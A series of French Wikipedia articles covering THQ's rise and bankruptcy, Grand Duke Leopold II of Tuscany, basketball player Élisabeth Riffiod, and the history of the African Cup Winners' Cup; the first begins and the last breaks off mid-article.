Le 10 mai 2007, THQ a annoncé les chiffres de vente et les bénéfices nets les plus élevés de son histoire pour l'année fiscale qui s'est terminée le 31 mars. Les revenus de THQ ont atteint plus d'un milliard de dollars. En mars 2008, THQ a annoncé le développement du tout premier jeu de pom-pom girls au monde utilisant la Wii Balance Board. Peu de temps après, le 3 novembre 2008, la société a fermé cinq de ses studios internes : Paradigm Entertainment, Mass Media Inc, Helixe, Locomotive Games et Sandblast Games. 
En 2009, l'énorme baisse des ventes a incité THQ à élaborer un plan stratégique visant à réduire les coûts annuels de 220 millions de dollars d'ici 2010 et à investir dans "des paris moins nombreux et plus intéressants". Auparavant, en 2007, THQ avait réalisé un bénéfice de 68 millions de dollars et un chiffre d'affaires d'un milliard de dollars, ce qui le plaçait à la portée de son rival Activision. Même si les critiques sont favorables, beaucoup de ses jeux à gros budget se sont mal vendus lors de la récession économique a frappé. En effet, sa part de marché concernant les jeux pour enfants basés sur les émissions de télévision de Nickelodeon et les films de Pixar s'est affaiblie : les enfants se tournent vers les jeux en ligne gratuits jouables sur Internet. Avec des actions en baisse de 86 % par rapport à l'année précédente et une valeur marchande de seulement 173 millions de dollars, THQ avait la possibilité d'être rachetée par d'autres sociétés. 
En mars 2009, THQ a scindé Heavy Iron Studios et Incinerator Studios en sociétés indépendantes. Il a été aussi annoncé qu'elle cherchait à vendre Big Huge Games. Deux mois plus tard, en mai 2009, THQ a accepté de vendre Big Huge Games à 38 Studios. 
En 2009, THQ rachète Midway Studios San Diego pour dollars américains. La vente inclut tous les actifs sauf la licence du jeu vidéo "TNA iMPACT!", qui revient à South Peak Interactive, et environ 40 % des employés se sont vu proposer un emploi. La plupart des anciens employés ont depuis été embauché par High Moon Studios.
En 2010, l'entreprise a annoncé des ventes nettes de 899,1 millions de dollars (du au ), en hausse de 69 millions de dollars par rapport à l'année précédente. Cependant, les pertes nettes étaient de 9,6 millions de dollars pour les 12 mois de l'année fiscale force à licencier des salariés. 
Restructuration et difficultés financières (2010-2012).
En février 2010, THQ a annoncé que Juice Games et Rainbow Studios feraient l'objet d'un remaniement, et porteraient désormais le nom de THQ Digital Warrington et THQ Digital Phoenix, respectivement. La fusion aurait entraîné 60 suppressions d'emplois entre le studio américain Rainbow de THQ et le studio britannique Juice Games.
En août 2010, THQ a dévoilé la uDraw GameTablet, un accessoire à 70 dollars pour la console Wii de Nintendo qui offre la possibilité aux joueurs de dessiner et de jouer sur leur écran de télévision. Ce périphérique blanc de 9 pouces sur 7 abrite une télécommande Wii sur la gauche, un bloc-notes et un stylet connecté sur la droite. THQ a déclaré que de nouveaux logiciels pour le uDraw seraient lancés tous les deux mois.
En janvier 2011, THQ a vendu sa division THQ Wireless à une entreprise (appelée 24MAS) basée en Suède qui est active sur le marché de la téléphonie mobile. 
Le 12 janvier 2011, THQ a dévoilé son nouveau logo.
En mars 2011, THQ, après la sortie de son jeu Homefront, a subi une chute de 26 % de ses actions en quelques heures. La forte baisse a été spéculée comme étant le résultat de la mauvaise réception de Homefront par les critiques.
Le 13 juin 2011, THQ a annoncé la fermeture du studio qui a développé Homefront, Kaos Studios et de THQ Digital Warrington (anciennement Juice Games).
Le 27 juillet 2011, THQ a annoncé qu'il abandonnait la franchise Red Faction. Cette décision serait due à la mauvaise réception du dernier jeu de la franchise, . 
Le 9 août 2011, THQ a annoncé que l'accent sera dorénavant mis sur le développement de titres sous licence destinés aux enfants et aux films en fermant THQ Studio Australia et Blue Tongue afin de se concentrer sur une "propriété intellectuelle de haute qualité". La société a également fermé THQ Digital Phoenix (anciennement Rainbow Studios) abandonnant ainsi la franchise MX vs ATV.
En novembre 2011, un uDraw pour la plau et la Xbox 360 est sorti. La vente est un échec commercial et est considéré comme l'une des principales causes des déboires financiers qui ont fait éclater la société.
En janvier 2012, THQ a annoncé qu'elle se retirait du secteur des jeux pour enfants sous licence pour se concentrer sur les jeux pour adultes tout en continuant à vendre les titres déjà sortis. 
En février 2012, THQ a également arrêté la tablette uDraw GameTablet.
En mai 2012, THQ a annoncé une perte nette de 239,9 millions de dollars pour l'année fiscale se terminant le 31 mars 2012. Cette perte était supérieure de 100 millions de dollars à celle de l'exercice précédent qui était de 136,1 millions de dollars. Le même mois, Jason Rubin a été nommé président de la société.
THQ a déposé un avis auprès de la SEC le 25 mai pour une réunion des actionnaires le 29 juin durant laquelle l'entreprise demandé aux actionnaires d'approuver un regroupement des actions ordinaires de la société. 
Le 4 juin 2012, THQ a annoncé un accord pour céder sa licence pour les jeux UFC à Electronic Arts. En juillet 2012, THQ a signalé que ses actionnaires avaient approuvé le regroupement de ses actions ordinaires à raison de 1 pour 10 pour éviter un retrait de la cote du NASDAQ.
Faillite et fermeture.
Le 13 novembre 2012, THQ a annoncé qu'elle n'avait pas remboursé un prêt de 50 millions de dollars accordé par Wells Fargo et qu'elle était au bord de la faillite. Le cours de son action est en chute libre passant de valeurs de début novembre frôlant les 3 dollars à 1,16 dollar en plus d'accuser un passif à long terme de 250 millions de dollars, THQ a été contraint de retarder les dates de sortie de ses titres phares Company of Heroes 2 et à mars 2013. 
Le 29 novembre 2012, THQ s'est associé à Humble Bundle pour lancer le Humble THQ Bundle dans le but de récolter davantage de fonds. 
Le 12 décembre 2012, THQ avait vendu près de 800 000 bundles, gagnant ainsi environ 5 millions de dollars ; le président de l'entreprise, Jason Rubin a également participé via un achat de 11 050 $ pour le bundle. 
Le 19 décembre 2012, quelques jours seulement après la fin du bundle Humble THQ, THQ a déposé une demande de mise en faillite en vertu du chapitre 11 avec l'intention de vendre THQ et tous ses actifs à Clearlake Capital Group tandis que la banque d'investissement Centerview Partners s'occupe de la vente. Skip Paul, un ancien collègue de Jason Rubin, a aidé à orchestrer l'offre d'accompagnement proposée par Clearlake Capital Group.Cependant, l'offre a finalement été refusée par le juge Mary F. Walrath. 
Le 22 janvier 2013 se tient une vente aux enchères individuelle des propriétés de THQ que les créanciers ont approuvé.
Lors de cette vente aux enchères, la franchise Homefront a été acquise par Crytek (qui a ensuite été rachetée par Koch Media), Relic Entertainment et les droits de jeu vidéo de la série Warhammer 40 000 ont été vendus à Sega, et les droits d'édition d'Evolve de Turtle Rock Studios et de la série WWE ont été acquis par Take-Two Interactive. L'éditeur français Ubisoft a acquis THQ Montréal et les droits d'édition de tandis que Volition et les droits d'édition de la franchise Metro ont été acquis par Koch Media. Vigil Games et l'unité d'édition de THQ étaient toujours inclus dans le dossier du chapitre 11, bien que tous les employés liés à ces entités aient été licenciés. Dans un message posté sur Twitter le 23 janvier, le producteur de PlatinumGames, Atsushi Inaba a communiqué son intérêt pour l'acquisition de la franchise Darksiders de THQ.
Le 26 février, THQ annonce la vente de ses propriétés restantes - les franchises Darksiders, Homeworld, Red Faction et Destroy All Humans !, ainsi que ses propriétés sous licence et originales - dans le cadre d'une vente aux enchères approuvée par le tribunal qui se tiendrait du 1er au 15 avril, le processus devant être achevé en mai. À peu près au même moment, THQ a fermé les serveurs du remake 2012 de Nexuiz, qui avait été développé par IllFonic. 
En juin 2013, Interplay Entertainment a acquis les droits de la franchise Freespace auprès de THQ.
En avril 2013, toutes les franchises restantes de THQ, y compris le reste de ses IP originales (à l'exception de Homeworld qui a été acquis par Gearbox Software et Drawn to Life, acquis par 505 Games) et les logiciels sous licence, ont été vendues aux enchères à Nordic Games. La licence de jeu Nickelodeon a été acquise par Activision. Cette licence ayant ensuite expirée, Nickelodeon concède ses franchises sous licence à divers petits éditeurs dont Nordic.
Les créanciers ont initialement déclaré que la vente proposée de THQ devant le tribunal des faillites profitait à la direction actuelle de THQ, y compris Rubin. Le juge Walwrath a qualifié ces critiques de "théorie de la conspiration". Les créanciers ont finalement libéré la direction de THQ, y compris Rubin, de toute malversation dans le plan officiel de liquidation de la société.
La faillite et liquidation de THQ a également touché d'autres studios ; le développeur britannique Blitz Games Studios a fermé en septembre 2013 à cause de difficultés financières. Le PDG, Philip Oliver, a déclaré que la disparition de THQ, qui était un client important pour le studio, était l'un des principaux facteurs ayant contribué à la fermeture.
Le 12 juin 2014, Nordic Games a annoncé avoir acquis la marque THQ, ce qui permet au studio de publier des jeux sous le nom de THQ.
En août 2016, la société a été rebaptisée THQ Nordic dans le but de mieux s'associer à la marque historique.
Montant des liquidations.
Les différents repreneurs ont payé plus de 100 millions de dollars dépassant alors les 60 millions proposés par Clearlake pour l'acquisition globale de la compagnie.
Quelques chiffres:
Hardware.
THQ lance la tablette uDraw, un périphérique qui se connecte à une manette de Wii, PlayStation 3 ou Xbox 360, livrée avec un stylet — pour pouvoir « dessiner » sur la tablette — et le jeu uDraw Studio, et qui permet de retranscrire le dessin sur l'écran de la TV. Ce périphérique est sorti sur Wii le et le sur Xbox 360 et PlayStation 3.
Le , THQ annonce que les versions PlayStation 3 et Xbox 360 de son périphérique ont engendré un échec commercial considérable.
Il est notable que c'est en partie une croyance aveugle et des investissements énormes sur uDraw qui ont conduit THQ à sa faillite en .

</doc>
<doc id="568287" url="https://fr.wikipedia.org/wiki?curid=568287" title="Léopold II (grand-duc de Toscane)">
Léopold II (grand-duc de Toscane)

Leopold de Habsbourg-Toscane (en italien : "Leopoldo Giovanni Giuseppe Francesco Ferdinando Carlo"), né le à Florence et mort le à Rome, est grand-duc de Toscane sous le nom de Léopold II ("Leopoldo II") de 1824 à 1859.
Sous son règne, Léopold est reconnu à la fois comme monarque libéral, appliquant la Constitution de 1848 et permettant une certaine liberté de presse. En 1847, le grand-duc, après la mort de la duchesse de Parme et la restauration des Bourbons-Parme, annexa le duché de Lucques. La même année, un conseil des ministres est créé. 
Léopold dut faire face à une rébellion populaire qui culmina avec le printemps des peuples en 1848. En Toscane, le grand-duc a ordonné la répression et a approuvé une constitution libérale. En dépit de ses tentatives d'acquiescement, des combats de rue éclatent en août à Livourne. Léopold II apporte son soutien au royaume de Sardaigne dans la guerre austro-sarde. En , le grand-duc dut abandonner la Toscane aux républicains et se réfugia dans la ville napolitaine de Gaète. Une république provisoire fut établie à sa place avec à sa tête Giuseppe Montanelli, qui inaugure une politique ultra démocratique (dans la terminologie politique de l’époque), tournée vers l’union avec les autres états italiens et la reprise conjointe de la guerre contre l'Autriche. Avec l’assistance de l'Autriche, Léopold est restauré à Florence. La Restauration laisse place à une période de répression violente contre les républicains. La constitution libérale est ainsi révoquée en 1852.
Lors de la deuxième guerre austro-sarde, Léopold se dissocie de la Sardaigne et s'allie à l'empire d'Autriche. Le roi Victor-Emmanuel II de Sardaigne s'empare de la Toscane et la conserve pendant toute la durée du conflit. Le grand-duc s'enfuit. La paix de Villafranca permet à Léopold de revenir une fois de plus. À son arrivée à Florence, il abdique en faveur de son fils aîné, Ferdinand IV. En , le Grand-Duché est réuni aux Duchés de Modène et de Parme pour former les Provinces-Unes d'Italie centrale, qui sont annexées par le royaume de Sardaigne quelques mois plus tard. Le , après un référendum, la Toscane est officiellement annexée à la Sardaigne. L'Italie est unifiée en 1870, la même année où meurt Léopold II.
Premières années.
Deuxième fils du grand-duc Ferdinand III de Toscane et de Louise de Bourbon-Siciles, Léopold vit très jeune dans les territoires du Saint-Empire romain germanique, où son père s'est réfugié après l'annexion napoléonienne. Il devient prince héréditaire du grand-duché de Toscane en 1800, à la mort de son frère aîné François-Léopold. Il suit son père exilé d'abord à Vienne, puis en 1803 à Salzbourg, où Ferdinand obtient réparation pour les territoires perdus l’espace de l’ancien domaine archiépiscopal. En mars 1805, Léopold est contraint d'abandonner cette ville à cause de la nouvelle guerre entre l'Autriche et la France. Il se rend donc à Wurtzbourg, où la famille s'installe dans l'ancien palais épiscopal. Au cours de ces années tourmentées, Léopold peut beaucoup étudier avec des professeurs allemands et italiens, manifestant ainsi une prédilection pour les sujets littéraires.
Il rentre à Florence le , après la première abdication de Napoléon, bien accueilli par ses sujets, également pour la politique de son père, qui ne purge ni ne se venge contre ceux qui ont collaboré avec le gouvernement français. Le jeune héritier du trône gagne l'affection des Toscans pour son caractère doux et son comportement informel, ce qui lui vaut le surnom de « Broncio » (« moue ») en raison de la lèvre inférieure légèrement saillante qui lui donne un air triste et perpétuel (alors qu'en réalité le jeune prince ne manquait pas de spiritualité).
Parallèlement, il termine ses études déjà entamées à l’étranger après des cours de droit, d’art et de littérature, voire d’agriculture, pour lesquels il fera toujours preuve d’une grande attention. Il se fixe comme objectif personnel de rassembler, d'étudier et de réorganiser tous les écrits de Galiléo Galilée et publie une édition des poèmes de Laurent de Médicis, qu'il édite personnellement, ce qui lui vaut d'être nommé membre de l'Accademia della Crusca.
En 1817, Léopold épouse Marie de Saxe, à laquelle il est particulièrement attaché et dont il a trois filles. Avec sa femme à partir de 1819, il entreprend un long voyage en Europe faisant étape à Munich, Dresde, Prague, Vienne et Venise. Son premier contact avec les affaires d'État a lieu en , lorsqu'il est appelé à Vérone pour prendre part avec son père aux travaux du Congrès de la Sainte-Alliance.
Grand-duc de Toscane.
Accession au trône.
À la mort de son père le , Léopold II prend le pouvoir et se montre immédiatement en souverain indépendant, appuyé par le ministre Vittorio Fossombroni, qui parvient à déjouer une manœuvre de l'ambassadeur autrichien, le comte de Bombelles, pour influencer le grand-duc inexpérimenté. Celui-ci confirme non seulement les ministres nommés par son père, mais témoigne immédiatement de son désir sincère de s'engager dans la voie d'une réduction de la taxe sur la viande et d'un plan de travaux publics prévoyant la poursuite de la réhabilitation de la Maremme (beaucoup de choses dont les Grossetani se souviendront avec un monument situé sur la Piazza Dante), l’extension du port de Livourne, la construction de nouvelles routes, un premier développement des activités touristiques (alors appelées "industrie étrangère") et l’exploitation des mines du grand-duché.
Politique libérale.
D'un point de vue politique, le gouvernement de Léopold II est à cette époque le plus doux et le plus tolérant des États italiens: la censure, confiée au savant et modéré père Mauro Bernardini de Cutigliano, n'a pas beaucoup d'occasions d'opérer et de nombreux représentants de la culture italienne persécutés ou n'ayant pas trouvé l'environnement idéal chez eux, trouvent asile en Toscane, comme Giacomo Leopardi, Alessandro Manzoni, Guglielmo Pepe, Niccolò Tommaseo. Certains écrivains et intellectuels toscans tels que Francesco Domenico Guerrazzi, Giovan Pietro Vieusseux et Giuseppe Giusti, qui, dans d'autres États italiens, auraient sûrement eu des problèmes, peuvent travailler en paix. À l'ambassadeur d'Autriche se plaignant que « la censure ne fait pas son devoir en Toscane », le grand-duc répond avec agacement « mais son devoir est de ne pas le faire », formule qui reste célèbre. Le seul inconvénient de tant de tolérance et de douceur est la suppression du magazine "L'Antologia" de Giovan Pietro Vieusseux, qui advient en 1833 sous la pression de l'Autriche et, en tout état de cause, sans autres conséquences civiles ou pénales pour le fondateur.
La douceur du gouvernement grand-ducal signifie qu'en Toscane, il n'y a ni motions ni séditions et que les activités de conspiration sont limitées à la ville de Livourne et d'une importance minime: les seuls actes répressifs sont en 1830 la suppression du journal « L'Indicatore Livornese » et la condamnation de Guerrazzi à six mois de réclusion à Montepulciano pour avoir prononcé un discours à la mémoire de Cosimo Del Fante. Des intellectuels tels que Niccolò Tommaseo et Giuseppe Giusti soulignent également la tranquillité du Grand-Duché. Ils vouent une satire agréable au grand-duc (« Il re travicello »), qui provoque la colère du destinataire, mais qui est ensuite gentiment séduit par l'intéressé.
Les soulèvements de 1831, qui choquent les deux duchés émiliens et les légations des États pontificaux, ne sont pas suivis en Toscane, malgré le fait que certains patriotes cherchent à les provoquer: le seul souci d'ordre public est de mieux protéger la frontière nord pour éviter l’intrusion de fauteurs de troubles.
En 1832, la grande-duchesse Marie meurt, laissant le grand-duc désespéré. Celui-ci, pour assurer sa succession, se remarie l'année suivante avec la princesse Marie-Antoinette de Bourbon-Siciles. De ce mariage Ferdinand, l'héritier tant attendu du trône, nait en 1835.
En 1839 et 1841, Léopold II autorise la tenue du « Congrès des scientifiques italiens » à Pise et à Florence, en dépit des menaces du gouvernement autrichien et des protestations du gouvernement pontifical; dans l'intervalle, le gouvernement grand-ducal prévoit un développement important du réseau ferroviaire qui, dans les années à venir, verrait la naissance de la « Ferrovia Leopolda » (chemin de fer reliant Florence-Pise-Livourne, avec la branche d'Empoli à Sienne) et de la « Ferrovia Maria Antonia » (Florence-Prato-Pistoia-Lucques), tandis que la « Ferrovia Ferdinanda » (Florence-Arezzo) et la « Ferrovia Maremmana » (Livourne- frontière de Chiarone) en restent à l'état de projet.
Le comportement du grand-duc à l'occasion de la grande inondation du , destiné à rester dans le cœur des Florentins (au moins jusqu'en 1849), est l'occasion pour le souverain de marquer sa bonne volonté en ouvrant les portes du palais Pitti aux personnes déplacées, s’engageant personnellement à secourir un bateau et à se rendre même dans les régions les plus reculées touchées par la catastrophe.
Annexion de Lucques.
En 1847, le grand-duc de Toscane doit faire face à une grave crise avec les souverains des deux duchés d'Emilie: cette année-là, certaines clauses du congrès de Vienne de 1815 et du traité de Florence de 1844 prévoient l'annexion par le grand-duché lorrain de presque tout l'ancien duché de Lucques, mais en même temps, il est établi que de vieilles enclaves toscanes de la Lunigiana passent sous les Bourbons de Parme et les Habsbourg-Este de Modène. Si, à Lucques, il est facile de dissiper le mécontentement des citoyens par une visite que rend le grand-duc bienfaisant, il n'en est pas de même dans les municipalités destinées à la vente. En Toscane, il en vient à déclarer la guerre aux deux États voisins, chose impensable pour le doux Léopold, qui tenta d'éviter la vente en offrant d'importantes sommes d'argent aux deux ducs. L'offre fut rejetée et les pressions furent transférées au profit de l'Autriche, le gouvernement de Vienne ne pouvant se permettre de créer une zone de troubles en ces temps déjà annoncés catastrophiques.
Révolution et premier exil.
En 1847, dans le contexte du processus réformiste suscité en Italie par l'élection du pape Pie IX, Léopold II se distingue par son engagement en faveur de la réforme: le , la liberté de la presse est garantie et le , une Garde civique (Guardia Civica) est créée. Au cours de la même période, le grand-duché de Toscane, les États pontificaux et le royaume de Sardaigne signèrent les préliminaires de la Ligue des douanes, que tous saluèrent comme prémices pour de futurs ajouts majeurs.
Le , quelques jours avant Charles Albert de Sardaigne, Léopold II accorde la Constitution, qui se distingue des autres en octroyant tous les droits aux citoyens de toutes les religions. Le naît le premier gouvernement constitutionnel toscan, présidé par François Cempini. Quelques jours plus tard, alors que les deux ducs émiliens sont obligés de fuir les insurrections, Léopold II réattribue à la Toscane les municipalités cédées en Lunigiana, la Haute Garfagnana Estense et l'ancien duché de Massa et de Carrare, dont les populations ont demandé à être toscanes, selon le principe selon lequel chaque peuple est libre de décider de son sort.
Le , le grand-duc suscite l'enthousiasme populaire en décidant d'envoyer les quelques troupes toscanes régulières, encadrées par des volontaires, combattre en Haute-Italie aux côtés des Sardes contre les Autrichiens. Tandis que la petite armée grand-ducale se dirige vers Pietrasanta et San Marcello Pistoiese, Léopold II remplace le drapeau Lorrain par le drapeau tricolore italien recouvrant les armoiries grand-ducales et adhérant personnellement au prêt de guerre.
L’attitude patriotique du grand-duc commence à évoluer au milieu de l’année, lorsque les attitudes expansionnistes du royaume de Sardaigne sont claires et en août, à la suite de violentes émeutes à Livourne, où il est contraint de renvoyer le gouvernement modéré de Gino Capponi et confier cette tâche aux démocrates Guerrazzi et Giuseppe Montanelli qui inaugurent une politique ultra-démocratique.
Restauration.
Le , Léopold II quitte Florence pour se réfugier d'abord à Sienne (et pour prétendre être malade, il a l'idée de recevoir les délégués florentins au lit, vêtus d'une chemise de nuit et d'une chemise pontificale), puis à Porto Santo Stefano. En ce lieu, il accepte et refuse à plusieurs reprises l'offre de l'ambassadeur du Piémont, Villamarina, de reprendre le pouvoir avec l'armée du royaume de Sardaigne, jusqu'à ce que, convaincu par sa cour de préférer l'Autriche, il se rend à Gaète, sous la protection de Ferdinand II des Deux-Siciles.
L'exil dure jusqu'en avril, date à laquelle, après la défaite de Charles Albert à Novara, les Toscans modérés renversent le gouvernement Guerrazzi afin d'éviter une invasion de l'Autriche et rappellent le grand-duc en espérant qu'il maintiendrait les réformes.
L'espoir est vain : le lieutenant-maréchal d'Aspre vient de Parme avec 18 000 hommes, prend et saccage Livourne, puis occupe Florence. Quelques mois plus tard, Léopold II débarque à Viareggio, mais a la mauvaise idée d'être escorté par des troupes autrichiennes et revêtu de l'uniforme autrichien, mettant un terme à la sympathie que les Toscans avaient pour le souverain.
Les actes des années de gouvernement suivantes éloignèrent encore plus les sujets les plus loyaux : l'abolition du Statut en 1852 et de la Garde civique ; l'occupation autrichienne et la formation d'une coûteuse armée toscane ; la répression sanglante du soulèvement de la ville de Livourne contre l'occupant autrichien ; le rétablissement de la peine de mort pour certains crimes (un fait retentissant pour la Toscane, le premier État abolitionniste de Pierre-Léopold, le grand-père du grand-duc).
Fin de la dynastie.
En , dans l'imminence de la guerre franco-piémontaise contre l'Autriche, Léopold II proclame la neutralité, mais le gouvernement grand-ducal a les jours comptés : le centre opérationnel du coup d'État imminent du se trouve être l’ambassade du Piémont à Florence. Cavour a envoyé au cours des jours précédents environ 80 carabiniers piémontais en tenue civile qui, à un signal prédéterminé et divisés en divers groupes dispersés dans divers quartiers de la ville, auraient dû commencer à crier contre le grand-duc et en faveur de la guerre contre l'Autriche. En outre, divers drapeaux tricolores avaient été préparés, prêts à être exposés aux balcons de divers bâtiments à un signal prédéterminé. En réalité, la population ignorait totalement ces véritables complots subversifs contre un État souverain par un autre État, précisément le royaume de Sardaigne.
Exil et fin de vie.
Le , vers quatre heures, refusant de donner son assentiment à la guerre contre l'Autriche, devant le refus de l'armée d'obéir et afin d'éviter des problèmes plus graves pour lui-même et son État, Léopold II part en voiture du Palais Pitti, en sortant par la porte de Boboli, vers la route de Bologne.
Cet effacement pacifique (le grand-duc n’avait jamais pensé à une solution violente) et les modalités du départ, avec peu d’effets personnels chargés dans quelques carrosses, la sympathie pour le personnel de la cour, permettent à Léopold de retrouver l'estime de ses désormais anciens sujets: la famille grand-ducale est saluée par les Florentins, qui lèvent leurs chapeaux au passage, criant (); il est accompagné avec tous les égards par une escorte jusqu'à Firenzuola, ancien poste de douane avec les États pontificaux. Le même jour, à six heures, la municipalité de Florence constate l'absence de toute disposition laissée par le souverain et nomme un gouvernement provisoire.
Réfugié à la cour de Vienne, l'ancien grand-duc n’abdique officiellement que le suivant; par la suite, il vit en Bohême, et se rend à Rome en 1869, où il meurt le , à Via delle Tre Cannelle. Enterré initialement à l'église des Saint-Apôtres, son corps est ensuite transféré à Vienne en 1914 pour être inhumé dans le mausolée des Habsbourg, la crypte des Capucins.
Descendance.
Léopold épouse la princesse Marie de Saxe, fille de Maximilien de Saxe et de Caroline de Bourbon-Parme, le . Ils ont trois filles. Marie meurt de la tuberculose en 1832.
De cette union naissent :
Le , Léopold se remarie en secondes noces avec Marie-Antoinette de Bourbon-Siciles, fille de François des Deux-Siciles et de Marie-Isabelle d'Espagne. Le couple a dix enfants. Marie-Antoinette meurt en exil en Autriche en 1898.
De cette union naîtront :
Dans la culture.
Une biographie romancée de son avant-dernier fils, Louis-Salvator de Habsbourg-Lorraine, écrite par Jean-Louis Sarthou, traite de leurs dernières années à Florence : "L'Archiduc sans frontière".

</doc>
<doc id="568290" url="https://fr.wikipedia.org/wiki?curid=568290" title="Élisabeth Riffiod">
Élisabeth Riffiod

Élisabeth Riffiod (née le ) est une ancienne joueuse internationale de basket-ball française, qui évoluait au poste de pivot. Avec 247 sélections en équipe de France et plusieurs titres de championne de France, elle est l'une des meilleures joueuses de l'histoire du basket-ball français. Elle est la mère de l'ancien international français Boris Diaw et de Martin Diaw, également basketteur.
Biographie.
Mesurant , elle découvre le basket-ball très tard en raison d'une grave maladie de sang dans son adolescence. Repérée pour sa grande taille et son agilité lors de sa première année à l'université de Besançon, elle intègre l'INSEP.
Elle est partie prenante de l'aventure des « demoiselles de Clermont », club mythique du basket-ball français. Au côté de joueuses telles que Jackie Chazalon, elle remporte six titres de championne de France et participe à quatre finales de coupe d'Europe. Malheureusement pour les Françaises, le club de Rīga règne alors sur l'Europe, porté par le talent et les de Uļjana Semjonova.
Elle rejoint ensuite le club d'Asnières avec lequel elle remporte un nouveau titre de championne de France. Plus tard, elle rejoint Mont-de-Marsan en Nationale 2 et termine sa carrière, à l'âge de 46 ans, en Régionale à Sainte-Eulalie.
Avec l'équipe de France, elle participe à six championnats d'Europe et deux championnats du monde. Cette carrière en bleu est couronnée par une médaille d'argent en 1970 aux championnats d'Europe. Elle a porté 247 fois le maillot de l'équipe de France, assurant le rôle de capitaine de 1976 à 1980.
Après sa carrière de joueuse, elle est professeur et termine sa carrière comme enseignante de biologie et entraineur de basket-ball à l'université de Bordeaux 3. 
Elle s'occupe des camps de jeunes et des activités sociales de son fils, présidant sa fondation caritative.
Vie privée.
Elle a eu deux enfants avec Issa Diaw, un sauteur en hauteur sénégalais rencontré à l'INSEP, Martin, né en 1978, jouant pour les JSA Bordeaux et depuis la saison 2015 - 2016 au Castelnau Médoc Basket Club et Boris, né en 1982, international de basket-ball français évoluant en NBA.

</doc>
<doc id="568293" url="https://fr.wikipedia.org/wiki?curid=568293" title="PokéDex">
PokéDex



</doc>
<doc id="568297" url="https://fr.wikipedia.org/wiki?curid=568297" title="Coupe d'Afrique des vainqueurs de coupe de football">
Coupe d'Afrique des vainqueurs de coupe de football

La Coupe d'Afrique des vainqueurs de coupe ou Coupe des coupes, parfois abrégée en C2 ou CVC, renommée Coupe des vainqueurs de coupe de la CAF en 1994, est une ancienne compétition africaine de football organisée par la CAF, qui réunissait les vainqueurs des Coupes de chaque pays africain. La première édition a lieu durant la saison 1974-1975 et la dernière, en 2002-2003. Elle est supprimée pour permettre l'extension de la Coupe de la confédération de la CAF. Les vainqueurs de coupes nationales ont conservé leur droit de disputer une Coupe d'Afrique et participent désormais à la "Coupe de la confédération".
À partir de 1993 un match mettant aux prises chaque année le vainqueur de la Coupe des clubs champions africains (« Ligue des champions » depuis 1997) et celui de la Coupe d'Afrique des vainqueurs de coupe est organisé. Le gagnant de la rencontre remporte la Supercoupe de la CAF. La Supercoupe est maintenue après la disparition de la Coupe des vainqueurs de coupe, elle oppose désormais le vainqueur de la Ligue des champions à celui de la Coupe de la CAF (« Coupe de la confédération » depuis 2004). À partir de 2021, la CAF propose à nouveau trois compétitions africaines de clubs, avec l'introduction de la Super-Ligue de la CAF (renommée en 2023 Ligue Africaine).
Histoire.
1975-1981 : Les débuts.
La compétition est mise en place au début de l'année 1975 par la CAF, suivant l'exemple de l'UEFA (en Europe, la Coupe d'Europe des vainqueurs de coupe de football, plus communément appelée "Coupe des Coupes" a été instaurée dès 1960). Pour la première édition, quinze équipes sont inscrites et c'est le club camerounais du Tonnerre Yaoundé qui a l'honneur d'inscrire le premier son nom au palmarès de l'épreuve, après avoir battu les Ivoiriens du Stella Club d'Adjamé en finale.
Ces premières années de compétition verront la domination des clubs d'Afrique équatoriale. Le Cameroun place un club en finale lors de cinq des sept premières éditions. Ainsi, le Tonnerre Yaoundé s'impose en 1975 et atteint la finale l'année suivante, le Canon Yaoundé s'incline également en finale en 1977. Le Tonnerre est rejoint au palmarès par deux autres formations camerounaises : le Canon Yaoundé, vainqueur en 1979 et l'Union Douala, titré en 1981. En plus de ces trois titres, les équipes camerounaises jouent et perdent deux autres finales, à chaque fois face à des clubs du Nigéria, Shooting Stars et Enugu Rangers, respectivement vainqueurs en 1976 et 1977. Un club de Guinée, Horoya AC (vainqueur en 1978) et le TP Mazembe (Zaïre), victorieux en 1980, confirment la mainmise des équipes d'Afrique centrale, notamment aux dépens des équipes du Maghreb, qui ne place qu'une seule équipe en finale lors des sept premières éditions; il s'agit du club algérien NA Hussein Dey.
Une première a lieu lors de l'édition 1977 avec l'affrontement entre deux formations d'un même pays. Lors des demi-finales, le tenant du titre, Shooting Stars FC s'incline à l'issue de la séance de tirs au but face à Enugu Rangers, qui remporte la compétition quelques semaines plus tard.
1982-1986 : La mainmise égyptienne.
Dès 1982, la donne change. En effet, le Maghreb sort victorieux de la compétition après le succès d'Al Moqaouloun al-Arab, face au club zambien de Power Dynamos FC. La formation égyptienne va d'ailleurs devenir la première à conserver son titre puisqu'elle s'impose la saison suivante face aux Togolais de l'OC Agaza de Lomé. Cette domination de l'Égypte va même se poursuivre jusqu'en 1986, avec le triplé inégalé d'Al Ahly SC de 1984 à 1986. Les Égyptiens vont à chaque fois défaire un club d'Afrique noire en finale : Power Dynamos de Zambie, l'Agaza Lomé, le Canon Yaoundé, les Nigérians de Leventis United et l'AS Sogara du Gabon.
Ayant remporté trois trophées lors de ses trois premières participations à l'épreuve, le club du Caire reste invaincu en Coupe des Coupes durant 30 matchs et ne défend pas son titre en 1987 après avoir remporté le championnat égyptien. Il connaît pour la première fois la défaite en Coupe des Coupes qu'en 1992, face au club ivoirien d'Africa Sports lors des quarts de finale (2-0, 0-3). Cette série de cinq succès en compétition continentale pour un seul et même pays est inégalée en Afrique.
1987-1991 : Duel Tunisie-Nigeria.
En 1987, c'est un club kényan, Gor Mahia FC, qui triomphe en s'imposant face à un club tunisien, l'Espérance sportive de Tunis, qui réussit à éliminer le représentant égyptien (le Tersana SC) dès les huitièmes de finale. La Tunisie et le Nigéria vont dominer la Coupe des Coupes entre 1987 et 1991. Les clubs tunisiens vont ainsi atteindre la finale à trois reprises pour un seul succès (le CA bizertin en 1988 face aux Nigérians de Ranchers Bees); le Nigéria fera mieux avec quatre finales consécutives entre 1988 et 1991 (plus une demi-finale en 1987), mais pour un unique titre (le club des BCC Lions en 1990, vainqueur face aux Tunisiens du Club africain). En plus de Gor Mahia, seul club kényan vainqueur d'une compétition continentale, deux autres clubs deviennent les seules formations de leur pays titrées en Coupe d'Afrique : Al Merreikh Omdurman du Soudan champion en 1989 et les Zambiens du Power Dynamos FC, titré en 1991.
1993-2003 : L'Afrique du Nord à l'honneur.
